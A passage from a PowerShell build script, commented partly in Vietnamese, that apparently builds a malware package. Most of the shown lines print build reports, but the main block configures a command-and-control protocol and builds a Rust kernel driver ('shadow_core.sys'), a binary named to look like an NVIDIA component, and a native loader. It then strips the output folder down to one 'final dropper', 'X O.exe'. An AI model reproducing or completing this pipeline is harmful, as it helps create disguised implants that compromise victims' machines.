                Write-StatusMessage "Full error autopsy saved to: $errorLog" "Warning"
                Write-Host ""
                Write-Host "--- ERROR PREVIEW (Tail) ---" -ForegroundColor Red
                $output | Select-Object -Last 15 | Write-Host -ForegroundColor Red
                Write-Host "----------------------------" -ForegroundColor Red
                
                $Script:BuildStats.Errors++
                # Không thoát ngay để anh còn nhìn thấy thống kê nhé
            }
        }
        else {
            Write-StatusMessage "vcvars64.bat not found" "Error"
            $Script:BuildStats.Errors++
        }
    }
    else {
        Write-StatusMessage "Visual Studio not installed" "Error"
        $Script:BuildStats.Errors++
    }
    
    Start-Sleep -Milliseconds 500
}

function Show-CompletionReport {
    $endTime = Get-Date
    $totalDuration = $endTime - $Script:BuildStats.StartTime
    
    Clear-Host
    Show-PulsarBanner
    
    # Completion Banner
    if ($Script:BuildStats.Errors -eq 0) {
        Write-Host ""
        Write-Host "  ╔═══════════════════════════════════════════════════════════════════╗" -ForegroundColor Green
        Write-Host "  ║                                                                   ║" -ForegroundColor Green
        Write-Host "  ║           " -NoNewline -ForegroundColor Green
        Write-Host "🎉  BUILD COMPLETED SUCCESSFULLY  🎉" -NoNewline -ForegroundColor White
        Write-Host "                   ║" -ForegroundColor Green
        Write-Host "  ║                                                                   ║" -ForegroundColor Green
        Write-Host "  ╚═══════════════════════════════════════════════════════════════════╝" -ForegroundColor Green
        Write-Host ""
    } else {
        Write-Host ""
        Write-Host "  ╔═══════════════════════════════════════════════════════════════════╗" -ForegroundColor Yellow
        Write-Host "  ║                                                                   ║" -ForegroundColor Yellow
        Write-Host "  ║           " -NoNewline -ForegroundColor Yellow
        Write-Host "⚠️   BUILD COMPLETED WITH WARNINGS  ⚠️" -NoNewline -ForegroundColor White
        Write-Host "                   ║" -ForegroundColor Yellow
        Write-Host "  ║                                                                   ║" -ForegroundColor Yellow
        Write-Host "  ╚═══════════════════════════════════════════════════════════════════╝" -ForegroundColor Yellow
        Write-Host ""
    }
    
    # Statistics
    Write-Host "  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓" -ForegroundColor Cyan
    Write-Host "  ┃  " -NoNewline -ForegroundColor Cyan
    Write-Host "📊  BUILD STATISTICS".PadRight(63) -NoNewline -ForegroundColor White
    Write-Host "  ┃" -ForegroundColor Cyan
    Write-Host "  ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫" -ForegroundColor Cyan
    
    $stats = @(
        @{ Icon = "⏱️"; Label = "Total Build Time"; Value = "{0:mm\:ss\.ff}" -f $totalDuration; Color = "White" },
        @{ Icon = "✅"; Label = "Successful Steps"; Value = ($Script:BuildStats.Steps | Where-Object { $_.Status -eq "Success" }).Count; Color = "Green" },
        @{ Icon = "⚠️"; Label = "Warnings"; Value = $Script:BuildStats.Warnings; Color = "Yellow" },
        @{ Icon = "❌"; Label = "Errors"; Value = $Script:BuildStats.Errors; Color = "Red" }
    )
    
    foreach ($stat in $stats) {
        Write-Host "  ┃    " -NoNewline -ForegroundColor Cyan
        Write-Host "$($stat.Icon)  " -NoNewline -ForegroundColor $stat.Color
        Write-Host "$($stat.Label): " -NoNewline -ForegroundColor Gray
        Write-Host $stat.Value.ToString().PadRight(46) -NoNewline -ForegroundColor $stat.Color
        Write-Host "  ┃" -ForegroundColor Cyan
    }
    
    Write-Host "  ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛" -ForegroundColor Cyan
    Write-Host ""
    
    # Build Steps
    if ($Script:BuildStats.Steps.Count -gt 0) {
        Write-Host "  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓" -ForegroundColor Magenta
        Write-Host "  ┃  " -NoNewline -ForegroundColor Magenta
        Write-Host "📝  BUILD STEPS SUMMARY".PadRight(63) -NoNewline -ForegroundColor White
        Write-Host "  ┃" -ForegroundColor Magenta
        Write-Host "  ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫" -ForegroundColor Magenta
        
        foreach ($step in $Script:BuildStats.Steps) {
            $icon = if ($step.Status -eq "Success") { "✓" } else { "✗" }
            $color = if ($step.Status -eq "Success") { "Green" } else { "Red" }
            $duration = if ($step.Duration -gt 0) { " ({0:F2}s)" -f $step.Duration } else { "" }
            
            Write-Host "  ┃    " -NoNewline -ForegroundColor Magenta
            Write-Host "$icon " -NoNewline -ForegroundColor $color
            Write-Host "$($step.Name)$duration".PadRight(59) -NoNewline -ForegroundColor Gray
            Write-Host "  ┃" -ForegroundColor Magenta
        }
        
        Write-Host "  ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛" -ForegroundColor Magenta
        Write-Host ""
    }
    
    # Output Artifacts
    Write-Host "  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓" -ForegroundColor Yellow
    Write-Host "  ┃  " -NoNewline -ForegroundColor Yellow
    Write-Host "📦  OUTPUT ARTIFACTS".PadRight(63) -NoNewline -ForegroundColor White
    Write-Host "  ┃" -ForegroundColor Yellow
    Write-Host "  ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫" -ForegroundColor Yellow
    Write-Host "  ┃                                                                   ┃" -ForegroundColor Yellow
    Write-Host "  ┃    📁 " -NoNewline -ForegroundColor Yellow
    Write-Host "Location: " -NoNewline -ForegroundColor Gray
    Write-Host $Script:DistDir.PadRight(52) -NoNewline -ForegroundColor White
    Write-Host "  ┃" -ForegroundColor Yellow
    Write-Host "  ┃                                                                   ┃" -ForegroundColor Yellow
    
    $artifacts = Get-ChildItem $Script:DistDir -File -ErrorAction SilentlyContinue | 
        Where-Object { $_.Extension -in @('.exe', '.dll', '.sys') }
    
    $totalSize = 0
    foreach ($artifact in $artifacts) {
        $sizeKB = [math]::Round($artifact.Length / 1KB, 2)
        $totalSize += $artifact.Length
        
        $icon = switch ($artifact.Extension) {
            ".exe" { "⚡" }
            ".dll" { "📚" }
            ".sys" { "🔧" }
            default { "📄" }
        }
        
        Write-Host "  ┃    $icon " -NoNewline -ForegroundColor Yellow
        Write-Host $artifact.Name.PadRight(40) -NoNewline -ForegroundColor White
        Write-Host "$sizeKB KB".PadLeft(17) -NoNewline -ForegroundColor Cyan
        Write-Host "  ┃" -ForegroundColor Yellow
    }
    
    Write-Host "  ┃                                                                   ┃" -ForegroundColor Yellow
    Write-Host "  ┃    Total Size: " -NoNewline -ForegroundColor Yellow
    Write-Host ("{0:F2} KB" -f ($totalSize / 1KB)).PadRight(47) -NoNewline -ForegroundColor Cyan
    Write-Host "  ┃" -ForegroundColor Yellow
    Write-Host "  ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛" -ForegroundColor Yellow
    Write-Host ""
    
    # Final Message
    if ($Script:BuildStats.Errors -eq 0) {
        Write-Host "  ═══════════════════════════════════════════════════════════════════" -ForegroundColor Green
        Write-Host "    ✨ " -NoNewline -ForegroundColor Yellow
        Write-Host "ALL SYSTEMS GO - READY FOR DEPLOYMENT" -NoNewline -ForegroundColor Green
        Write-Host " ✨" -ForegroundColor Yellow
        Write-Host "  ═══════════════════════════════════════════════════════════════════" -ForegroundColor Green
    } else {
        Write-Host "  ═══════════════════════════════════════════════════════════════════" -ForegroundColor Yellow
        Write-Host "    ⚠️  " -NoNewline -ForegroundColor Yellow
        Write-Host "REVIEW WARNINGS BEFORE DEPLOYMENT" -NoNewline -ForegroundColor Yellow
        Write-Host " ⚠️" -ForegroundColor Yellow
        Write-Host "  ═══════════════════════════════════════════════════════════════════" -ForegroundColor Yellow
    }
    
    Write-Host ""
    Write-Host "  🎯 Press any key to exit..." -ForegroundColor DarkGray
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}

# =============================================================================
# 🎬 MAIN EXECUTION
# =============================================================================

try {
    Show-PulsarBanner
    Start-Sleep -Milliseconds 800
    
    Initialize-BuildSystem
    Clean-BuildWorkspace
    
    $c2Config = Configure-C2Protocol
    
    Build-DotNetPlugin
    Build-RustKernelDriver
    
    # Pre-Loader Check
    Write-SectionHeader -Title "PRE-LOADER VALIDATION" -Icon "🔍" -Color "Cyan"
    $required = @(
        (Join-Path $Script:DistDir "shadow_core.sys"),
        (Join-Path $Script:DistDir "nvhda64v_inner.exe")
    )
    
    foreach ($file in $required) {
        if (-not (Test-Path $file)) {
            Write-StatusMessage "Required artifact missing: $(Split-Path $file -Leaf)" "Error"
            $Script:BuildStats.Errors++
            exit 1
        }
        Write-StatusMessage "Artifact verified: $(Split-Path $file -Leaf)" "Success"
    }

        Build-NativeLoader $c2Config

        

            # Final Purification: Strictly only keep "X O.exe"

        

            Write-SectionHeader -Title "ULTIMATE PURIFICATION" -Icon "[#]" -Color "Magenta"

        

            $finalDropper = Join-Path $Script:DistDir $Script:LoaderExe

        

            if (Test-Path $finalDropper) {

        

                Write-StatusMessage "Securing the only artifact: X O.exe" "Success"

        

                # Xóa sạch mọi thứ trừ X O.exe 💋

        

                Get-ChildItem $Script:DistDir | Where-Object { $_.Name -ne $Script:LoaderExe } | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue

        

                Write-StatusMessage "The Singularity achieved. Only X O.exe remains." "Complete"

        

            }

        

        

    

        Show-CompletionReport

    
}
catch {
    Clear-Host
    Write-Host ""
    Write-Host "  ╔═══════════════════════════════════════════════════════════════════╗" -ForegroundColor Red
    Write-Host "  ║                                                                   ║" -ForegroundColor Red
    Write-Host "  ║                  💥  CRITICAL BUILD ERROR  💥                     ║" -ForegroundColor Red
    Write-Host "  ║                                                                   ║" -ForegroundColor Red
    Write-Host "  ╚═══════════════════════════════════════════════════════════════════╝" -ForegroundColor Red
    Write-Host ""
    Write-Host "  Error Message:" -ForegroundColor Yellow
    Write-Host "  $($_.Exception.Message)" -ForegroundColor Red
    Write-Host ""
    Write-Host "  Stack Trace:" -ForegroundColor Yellow
    Write-Host "  $($_.ScriptStackTrace)" -ForegroundColor DarkGray
    Write-Host ""
    Write-Host "  Press any key to exit..." -ForegroundColor DarkGray
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    exit 1
}